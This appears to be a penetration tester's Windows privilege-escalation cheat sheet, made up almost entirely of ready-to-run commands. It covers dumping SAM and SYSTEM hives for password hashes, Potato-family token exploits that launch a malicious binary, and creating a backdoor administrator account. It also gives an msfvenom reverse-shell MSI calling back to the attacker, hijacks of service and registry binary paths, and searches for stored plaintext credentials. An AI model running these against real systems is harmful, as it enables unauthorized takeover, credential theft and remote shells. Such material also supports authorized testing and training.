# Windows

## Find Windows Kernel Vulnerabilities

```
systeminfo
```

{% code overflow="wrap" %}
```
wes /tmp/systeminfo.txt -c -e --definitions /opt/wesng/definitions.zip -i "Elevation Of Privilege" | egrep -i exploit-db
```
{% endcode %}

{% code overflow="wrap" %}
```
wes /tmp/systeminfo.txt -c -e --definitions /opt/wesng/definitions.zip -i 'Remote Code Execution' | egrep -i exploit-db
```
{% endcode %}

{% code overflow="wrap" %}
```
windows-exploit-suggester.py --systeminfo /tmp/systeminfo.txt -d /opt/winreconpack/2022-10-09-mssb.xls
```
{% endcode %}

## Test For Previously Used credentials

```
cmdkey /list
```

```
runas /savecred /user:someuser whoami.exe
```

## Test For abuseable privileges

```
whoami /priv
```

### SeBackupPrivilege

```
reg.exe save hklm\sam sam.save
```

```
reg.exe save hklm\system system.save
```

```
secretsdump.py -sam sam.save -system system.save local
```

### SeRestorePrivilege

```
SeRestoreAbuse.exe "cmd /c net user thescriptkid thescriptkid /add"
```

```
SeRestoreAbuse.exe "cmd /c net localgroup administrators thescriptkid /add"
```

```
secretsdump.py domain.local/user:password@$ip
```

### SeImpersonatePrivilege OR SeAssignPrimaryToken

#### **RoguePotato**

_If the machine is >= Windows 10 1809 & Windows Server 2019_

```
socat tcp-listen:135,reuseaddr,fork tcp:Windowsip:9999
```

_Transfer a malicious binary or nc.exe before running the following command_

```
RoguePotato.exe -r Kali-ip -e "C:\full\path\to\malicious.exe" -l 9999
```

#### **JuicyPotato**

_If the machine is < Windows 10 1809 < Windows Server 2019_

{% code overflow="wrap" %}
```
juicypotato.exe -l 1337 -p c:\full\path\to\malicious.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} OR {4991d34b-80a1-4291-83b6-3328366b9097}
```
{% endcode %}

#### **PrintSpoofer**

```
printspoofer.exe -c "C:\full\path\to\malicious.exe" -i
```

#### **HotPotato**

_Windows 7, 8, 10, Server 2008, and Server 2012_

### SeDebugPrivilege

### SeShutdownPrivilege

```
shutdown /r /t 0
```

### SeManageVolumePrivilege

### SeTakeOwnershipPrivilege

## Test For alwayselevated

_Both must queryies must return_ `0x1`

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

{% code overflow="wrap" %}
```
msfvenom -p windows/x64/shell_reverse_tcp HOST=$tun0 LPORT=53 -f msi -o thescriptkid.msi
```
{% endcode %}

```
msiexec /quiet /qn /i C:\Windows\Temp\thescriptkid.msi
```

## Find Insecure Sam System backups

```
.\accesschk.exe -qlv C:\Windows\repair\Sam
```

```
.\accesschk.exe -qlv C:\Windows\repair\System
```

## Non-default Programs Discovery

_This may reveal vulnerable server software or client software to elevate privileges_

```
cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

```
dir "C:\ProgramData"
```

```
dir "C:\Program Files"
```

```
dir "C:\Program Files (x86)"
```

{% code overflow="wrap" %}
```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
{% endcode %}

{% code overflow="wrap" %}
```
Get-ChildItem "C:\Program Files (x86)" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
{% endcode %}

```
.\accesschk.exe -uws "Everyone" "C:\Program Files"
```

```
.\accesschk.exe -uws "Everyone" "C:\Program Files (x86)
```

## Test For Plaintext passwords

#### In Unattended Files

```
type C:\Windows\Panther\Unattended.xml
```

```
type C:\Windows\Panther\Unattend\Unattended.xml
```

#### In Registries

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```

#### In WinLogon

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

#### In SNMP Paraemeters

```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

#### In Sticky Notes

{% code overflow="wrap" %}
```
type C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```
{% endcode %}

#### Or with PowerShell

{% code overflow="wrap" %}
```
type $home\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```
{% endcode %}

#### In Clipboard

```
powershell -command "Get-Clipboard"
```

#### In VNC

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

#### In Putty

```
reg query HKEY_CURRENT_USER\Software\%username%\Putty\Sessions\ /f "Proxy" /s
```

#### Or With PowerShell

```
reg query HKEY_CURRENT_USER\Software\$env:username\Putty\Sessions\ /f "Proxy" /s
```

#### In Powershell History

{% code overflow="wrap" %}
```
type $home\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
{% endcode %}

#### In IIS WebServer configs

{% code overflow="wrap" %}
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
{% endcode %}

```
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

#### In WebServer Directories

{% code overflow="wrap" %}
```
findstr /si password *.txt *.ini *.config *.php *.pl *.xml *.xls *.xlsx *.csv *.doc *.docx
```
{% endcode %}

## Test For AutoRuns

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

```
accesschk.exe -qlwv C:\path\to\executeable
```

## Unmount Disks/Drives

```
mountvol
```

```
Get-PSdrive
```

## Test Services

{% code overflow="wrap" %}
```
Get-CIMInstance -Class Win32_Service | select Name,PathName,StartMode,Started,StartName,State
```
{% endcode %}

```
wmic service get name,displayname,pathname,startmode
```

```
.\accesschk.exe /accepteula -uwcqv someuser *
```

```
sc.exe qc someservice
```

### Insecure Service Executables

```
.\accesschk.exe -ulvqws everyone "C:\program files"
```

#### Or

```
icacls C:\path\to\insecureExecutable.exe
```

```
wmic service get name,pathname | findstr insecureExecutable.exe
```

```
sc qc someservice
```

```
.\accesschk.exe -qlcv someservice
```

```
icacls malicious.exe /grant Everyone:F
```

```
sc stop/start OR shutdown /r /t 0
```

### Unquoted Service Paths

```
icacls C:\path\to\this directory\executable.exe
```

_Create file at C:\path\to\this.exe_

```
icacls C:\path\to\this.exe /grant Everyone:F
```

```
sc stop/start OR shutdown /r /t 0
```

### Insecure Service Permissions

```
.\accesschk.exe /accepteula -uwcqv someuser *
```

```
.\accesschk.exe /accepteula -qlcv someservice
```

```
icacls malicious.exe /grant Everyone:F
```

```
sc config someservice binpath="C:\path\to\malicious.exe" obj= LocalSystem
```

```
sc stop/start someservice
```

## Weak Registry Permissions

{% code overflow="wrap" %}
```
.\accesschk.exe -ulvqkws grouporuser HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
```
{% endcode %}

```
reg query \path\to\regservice
```

```
sc qc regservice
```

{% code overflow="wrap" %}
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regservice /v ImagePath /t REG_EXPAND_SZ /d C:\path\to\malicious.exe /f
```
{% endcode %}

## Test For Scheduled Tasks

_Useful to have time_

```
Get-Date
```

{% code overflow="wrap" %}
```
schtasks /query /fo list /v | findstr /c:"User:" /c:"Run:" /c:"TaskName:" /c:"Start Time:" /c:"Last Run Time:" /c:"Start Time:"
```
{% endcode %}

```
schtasks /query /tn \path\to\sometask /fo list /v
```

```
icacls C:\Path\to\taskExecutable
```

_Read code if non EXE_

```
type C:\Path\to\script
```

_Replace / modify content for code execution_

_Force execution or wait for task to run_

```
schtasks /run /tn sometask
```

## Test For StartUp Apps

{% code overflow="wrap" %}
```
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
{% endcode %}

## Test For Insecure GUI Apps

_Search and run GUI Apps as they may be ran as a privileged user_

```
tasklist /V
```

_Research for ways to potentially open a cmd prompt_

## Find Vulnerable Driver

_List All Drivers_

{% code overflow="wrap" %}
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object   'Display Name', 'Start Mode', Path
```
{% endcode %}

_Get information on specific driver software based on name_

```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,  
DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```
